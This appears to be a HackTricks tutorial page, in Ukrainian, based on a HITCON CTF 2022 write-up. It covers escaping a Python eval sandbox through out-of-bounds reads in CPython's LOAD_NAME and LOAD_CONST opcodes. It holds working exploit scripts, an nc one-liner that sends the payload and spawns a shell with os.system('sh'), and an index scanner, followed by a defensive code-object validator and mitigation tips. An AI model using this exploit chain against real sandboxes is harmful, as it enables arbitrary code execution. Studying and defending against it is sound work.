# LOAD_NAME / LOAD_CONST opcode OOB Read

{{#include ../../../banners/hacktricks-training.md}}

**Ця інформація була взята** [**з цього опису**](https://blog.splitline.tw/hitcon-ctf-2022/)**.**

### TL;DR <a href="#tldr-2" id="tldr-2"></a>

Ми можемо використовувати функцію OOB read в LOAD_NAME / LOAD_CONST opcode, щоб отримати деякий символ в пам'яті. Це означає використання трюку на кшталт `(a, b, c, ... сотні символів ..., __getattribute__) if [] else [].__getattribute__(...)`, щоб отримати символ (такий як ім'я функції), який вам потрібен.

Просто створіть свій експлойт.

### Overview <a href="#overview-1" id="overview-1"></a>

Джерельний код досить короткий, містить лише 4 рядки!
```python
source = input('>>> ')
if len(source) > 13337: exit(print(f"{'L':O<13337}NG"))
code = compile(source, '∅', 'eval').replace(co_consts=(), co_names=())
print(eval(code, {'__builtins__': {}}))1234
```
Ви можете ввести довільний код Python, і він буде скомпільований в [об'єкт коду Python](https://docs.python.org/3/c-api/code.html). Однак `co_consts` та `co_names` цього об'єкта коду будуть замінені на порожній кортеж перед eval цього об'єкта коду.

Таким чином, всі вирази, що містять константи (наприклад, числа, рядки тощо) або імена (наприклад, змінні, функції), можуть призвести до сегментаційної помилки в кінці.

### Out of Bound Read <a href="#out-of-bound-read" id="out-of-bound-read"></a>

Як відбувається сегментаційна помилка?

Почнемо з простого прикладу, `[a, b, c]` може бути скомпільовано в наступний байт-код.
```
1           0 LOAD_NAME                0 (a)
2 LOAD_NAME                1 (b)
4 LOAD_NAME                2 (c)
6 BUILD_LIST               3
8 RETURN_VALUE12345
```
Але що, якщо `co_names` стане порожнім кортежем? Опкод `LOAD_NAME 2` все ще виконується і намагається прочитати значення з тієї адреси пам'яті, з якої він спочатку повинен бути. Так, це "функція" читання за межами межі.

Основна концепція рішення проста. Деякі опкоди в CPython, наприклад `LOAD_NAME` і `LOAD_CONST`, вразливі (?) до OOB читання.

Вони отримують об'єкт з індексу `oparg` з кортежу `consts` або `names` (так називаються `co_consts` і `co_names` під капотом). Ми можемо звернутися до наступного короткого фрагмента про `LOAD_CONST`, щоб побачити, що CPython робить, коли обробляє опкод `LOAD_CONST`.
```c
case TARGET(LOAD_CONST): {
PREDICTED(LOAD_CONST);
PyObject *value = GETITEM(consts, oparg);
Py_INCREF(value);
PUSH(value);
FAST_DISPATCH();
}1234567
```
Таким чином, ми можемо використовувати функцію OOB, щоб отримати "ім'я" з довільного зсуву пам'яті. Щоб дізнатися, яке ім'я воно має і який його зсув, просто продовжуйте пробувати `LOAD_NAME 0`, `LOAD_NAME 1` ... `LOAD_NAME 99` ... І ви можете знайти щось при oparg > 700. Ви також можете спробувати використовувати gdb, щоб подивитися на розклад пам'яті, звичайно, але я не думаю, що це буде легше?

### Генерація експлойту <a href="#generating-the-exploit" id="generating-the-exploit"></a>

Як тільки ми отримаємо ці корисні зсуви для імен / констант, як _ми_ отримуємо ім'я / константу з цього зсуву і використовуємо його? Ось трюк для вас:\
Припустимо, ми можемо отримати ім'я `__getattribute__` з зсуву 5 (`LOAD_NAME 5`) з `co_names=()`, тоді просто зробіть наступні дії:
```python
[a,b,c,d,e,__getattribute__] if [] else [
[].__getattribute__
# you can get the __getattribute__ method of list object now!
]1234
```
> Зверніть увагу, що немає необхідності називати його як `__getattribute__`, ви можете назвати його коротше або якимось дивним чином

Ви можете зрозуміти причину, просто переглянувши його байт-код:
```python
0 BUILD_LIST               0
2 POP_JUMP_IF_FALSE       20
>>    4 LOAD_NAME                0 (a)
>>    6 LOAD_NAME                1 (b)
>>    8 LOAD_NAME                2 (c)
>>   10 LOAD_NAME                3 (d)
>>   12 LOAD_NAME                4 (e)
>>   14 LOAD_NAME                5 (__getattribute__)
16 BUILD_LIST               6
18 RETURN_VALUE
20 BUILD_LIST               0
>>   22 LOAD_ATTR                5 (__getattribute__)
24 BUILD_LIST               1
26 RETURN_VALUE1234567891011121314
```
Зверніть увагу, що `LOAD_ATTR` також отримує ім'я з `co_names`. Python завантажує імена з одного й того ж зсуву, якщо ім'я однакове, тому другий `__getattribute__` все ще завантажується з offset=5. Використовуючи цю функцію, ми можемо використовувати довільне ім'я, як тільки ім'я знаходиться в пам'яті поблизу.

Для генерації чисел це має бути тривіально:

- 0: not \[\[]]
- 1: not \[]
- 2: (not \[]) + (not \[])
- ...

### Exploit Script <a href="#exploit-script-1" id="exploit-script-1"></a>

Я не використовував константи через обмеження довжини.

По-перше, ось скрипт, щоб знайти ці зсуви імен.
```python
from types import CodeType
from opcode import opmap
from sys import argv


class MockBuiltins(dict):
def __getitem__(self, k):
if type(k) == str:
return k


if __name__ == '__main__':
n = int(argv[1])

code = [
*([opmap['EXTENDED_ARG'], n // 256]
if n // 256 != 0 else []),
opmap['LOAD_NAME'], n % 256,
opmap['RETURN_VALUE'], 0
]

c = CodeType(
0, 0, 0, 0, 0, 0,
bytes(code),
(), (), (), '<sandbox>', '<eval>', 0, b'', ()
)

ret = eval(c, {'__builtins__': MockBuiltins()})
if ret:
print(f'{n}: {ret}')

# for i in $(seq 0 10000); do python find.py $i ; done1234567891011121314151617181920212223242526272829303132
```
А наступне призначене для створення реального експлойту Python.
```python
import sys
import unicodedata


class Generator:
# get numner
def __call__(self, num):
if num == 0:
return '(not[[]])'
return '(' + ('(not[])+' * num)[:-1] + ')'

# get string
def __getattribute__(self, name):
try:
offset = None.__dir__().index(name)
return f'keys[{self(offset)}]'
except ValueError:
offset = None.__class__.__dir__(None.__class__).index(name)
return f'keys2[{self(offset)}]'


_ = Generator()

names = []
chr_code = 0
for x in range(4700):
while True:
chr_code += 1
char = unicodedata.normalize('NFKC', chr(chr_code))
if char.isidentifier() and char not in names:
names.append(char)
break

offsets = {
"__delitem__": 2800,
"__getattribute__": 2850,
'__dir__': 4693,
'__repr__': 2128,
}

variables = ('keys', 'keys2', 'None_', 'NoneType',
'm_repr', 'globals', 'builtins',)

for name, offset in offsets.items():
names[offset] = name

for i, var in enumerate(variables):
assert var not in offsets
names[792 + i] = var


source = f'''[
({",".join(names)}) if [] else [],
None_ := [[]].__delitem__({_(0)}),
keys := None_.__dir__(),
NoneType := None_.__getattribute__({_.__class__}),
keys2 := NoneType.__dir__(NoneType),
get := NoneType.__getattribute__,
m_repr := get(
get(get([],{_.__class__}),{_.__base__}),
{_.__subclasses__}
)()[-{_(2)}].__repr__,
globals := get(m_repr, m_repr.__dir__()[{_(6)}]),
builtins := globals[[*globals][{_(7)}]],
builtins[[*builtins][{_(19)}]](
builtins[[*builtins][{_(28)}]](), builtins
)
]'''.strip().replace('\n', '').replace(' ', '')

print(f"{len(source) = }", file=sys.stderr)
print(source)

# (python exp.py; echo '__import__("os").system("sh")'; cat -) | nc challenge.server port
12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273
```
В основному це робить такі речі, для тих рядків, які ми отримуємо з методу `__dir__`:
```python
getattr = (None).__getattribute__('__class__').__getattribute__
builtins = getattr(
getattr(
getattr(
[].__getattribute__('__class__'),
'__base__'),
'__subclasses__'
)()[-2],
'__repr__').__getattribute__('__globals__')['builtins']
builtins['eval'](builtins['input']())
```
---

### Примітки до версії та уражені опкоди (Python 3.11–3.13)

- Опкоди байт-коду CPython все ще індексують кортежі `co_consts` та `co_names` за допомогою цілочисельних операндів. Якщо зловмисник може змусити ці кортежі бути порожніми (або меншими за максимальний індекс, що використовується байт-кодом), інтерпретатор буде читати пам'ять за межами меж для цього індексу, що призведе до отримання довільного вказівника PyObject з сусідньої пам'яті. Відповідні опкоди включають принаймні:
- `LOAD_CONST consti` → читає `co_consts[consti]`.
- `LOAD_NAME namei`, `STORE_NAME`, `DELETE_NAME`, `LOAD_GLOBAL`, `STORE_GLOBAL`, `IMPORT_NAME`, `IMPORT_FROM`, `LOAD_ATTR`, `STORE_ATTR` → читають імена з `co_names[...]` (для 3.11+ зверніть увагу, що `LOAD_ATTR`/`LOAD_GLOBAL` зберігають біти прапорців у найменшому біті; фактичний індекс - `namei >> 1`). Дивіться документацію дизасемблера для точних семантик для кожної версії. [Python dis docs].
- Python 3.11+ впровадив адаптивні/вбудовані кеші, які додають приховані записи `CACHE` між інструкціями. Це не змінює OOB примітив; це лише означає, що якщо ви вручну створюєте байт-код, ви повинні враховувати ці кеш-елементи при побудові `co_code`.

Практичне значення: техніка на цій сторінці продовжує працювати на CPython 3.11, 3.12 та 3.13, коли ви можете контролювати об'єкт коду (наприклад, через `CodeType.replace(...)`) і зменшити `co_consts`/`co_names`.

### Швидкий сканер для корисних OOB індексів (сумісний з 3.11+/3.12+)

Якщо ви віддаєте перевагу перевіряти цікаві об'єкти безпосередньо з байт-коду, а не з високорівневого виходу, ви можете генерувати мінімальні об'єкти коду та грубо перебирати індекси. Допоміжна програма нижче автоматично вставляє вбудовані кеші, коли це необхідно.
```python
import dis, types

def assemble(ops):
# ops: list of (opname, arg) pairs
cache = bytes([dis.opmap.get("CACHE", 0), 0])
out = bytearray()
for op, arg in ops:
opc = dis.opmap[op]
out += bytes([opc, arg])
# Python >=3.11 inserts per-opcode inline cache entries
ncache = getattr(dis, "_inline_cache_entries", {}).get(opc, 0)
out += cache * ncache
return bytes(out)

# Reuse an existing function's code layout to simplify CodeType construction
base = (lambda: None).__code__

# Example: probe co_consts[i] with LOAD_CONST i and return it
# co_consts/co_names are intentionally empty so LOAD_* goes OOB

def probe_const(i):
code = assemble([
("RESUME", 0),          # 3.11+
("LOAD_CONST", i),
("RETURN_VALUE", 0),
])
c = base.replace(co_code=code, co_consts=(), co_names=())
try:
return eval(c)
except Exception:
return None

for idx in range(0, 300):
obj = probe_const(idx)
if obj is not None:
print(idx, type(obj), repr(obj)[:80])
```
Notes
- Щоб замість цього перевірити імена, замініть `LOAD_CONST` на `LOAD_NAME`/`LOAD_GLOBAL`/`LOAD_ATTR` і відповідно налаштуйте використання стеку.
- Використовуйте `EXTENDED_ARG` або кілька байтів `arg`, щоб досягти індексів >255, якщо це необхідно. Коли ви будуєте з `dis`, як зазначено вище, ви контролюєте лише низький байт; для більших індексів створіть сирі байти самостійно або розділіть атаку на кілька завантажень.

### Minimal bytecode-only RCE pattern (co_consts OOB → builtins → eval/input)

Якщо ви визначили індекс `co_consts`, який відповідає модулю builtins, ви можете відтворити `eval(input())` без жодних `co_names`, маніпулюючи стеком:
```python
# Build co_code that:
# 1) LOAD_CONST <builtins_idx> → push builtins module
# 2) Use stack shuffles and BUILD_TUPLE/UNPACK_EX to peel strings like 'input'/'eval'
#    out of objects living nearby in memory (e.g., from method tables),
# 3) BINARY_SUBSCR to do builtins["input"] / builtins["eval"], CALL each, and RETURN_VALUE
# This pattern is the same idea as the high-level exploit above, but expressed in raw bytecode.
```
Цей підхід корисний у завданнях, які надають вам прямий контроль над `co_code`, одночасно примушуючи `co_consts=()` та `co_names=()` (наприклад, BCTF 2024 “awpcode”). Він уникає трюків на рівні виходу та зберігає малий розмір корисного навантаження, використовуючи операції стеку байт-коду та побудовники кортежів.

### Захисні перевірки та пом'якшення для пісочниць

Якщо ви пишете “пісочницю” на Python, яка компілює/оцінює ненадійний код або маніпулює об'єктами коду, не покладайтеся на CPython для перевірки меж індексів кортежів, що використовуються байт-кодом. Натомість, перевіряйте об'єкти коду самостійно перед їх виконанням.

Практичний валідатор (відхиляє OOB доступ до co_consts/co_names)
```python
import dis

def max_name_index(code):
max_idx = -1
for ins in dis.get_instructions(code):
if ins.opname in {"LOAD_NAME","STORE_NAME","DELETE_NAME","IMPORT_NAME",
"IMPORT_FROM","STORE_ATTR","LOAD_ATTR","LOAD_GLOBAL","DELETE_GLOBAL"}:
namei = ins.arg or 0
# 3.11+: LOAD_ATTR/LOAD_GLOBAL encode flags in the low bit
if ins.opname in {"LOAD_ATTR","LOAD_GLOBAL"}:
namei >>= 1
max_idx = max(max_idx, namei)
return max_idx

def max_const_index(code):
return max([ins.arg for ins in dis.get_instructions(code)
if ins.opname == "LOAD_CONST"] + [-1])

def validate_code_object(code: type((lambda:0).__code__)):
if max_const_index(code) >= len(code.co_consts):
raise ValueError("Bytecode refers to const index beyond co_consts length")
if max_name_index(code) >= len(code.co_names):
raise ValueError("Bytecode refers to name index beyond co_names length")

# Example use in a sandbox:
# src = input(); c = compile(src, '<sandbox>', 'exec')
# c = c.replace(co_consts=(), co_names=())       # if you really need this, validate first
# validate_code_object(c)
# eval(c, {'__builtins__': {}})
```
Додаткові ідеї для пом'якшення
- Не дозволяйте довільний `CodeType.replace(...)` на ненадійних даних, або додайте суворі структурні перевірки на отриманому об'єкті коду.
- Розгляньте можливість виконання ненадійного коду в окремому процесі з пісочницею на рівні ОС (seccomp, job objects, containers) замість покладання на семантику CPython.



## Посилання

- Звіт Splitline про HITCON CTF 2022 “V O I D” (походження цієї техніки та високорівнева експлойт-ланцюг): https://blog.splitline.tw/hitcon-ctf-2022/
- Документація Python disassembler (семантика індексів для LOAD_CONST/LOAD_NAME/etc., та низькі біти прапорців `LOAD_ATTR`/`LOAD_GLOBAL` для 3.11+): https://docs.python.org/3.13/library/dis.html
{{#include ../../../banners/hacktricks-training.md}}
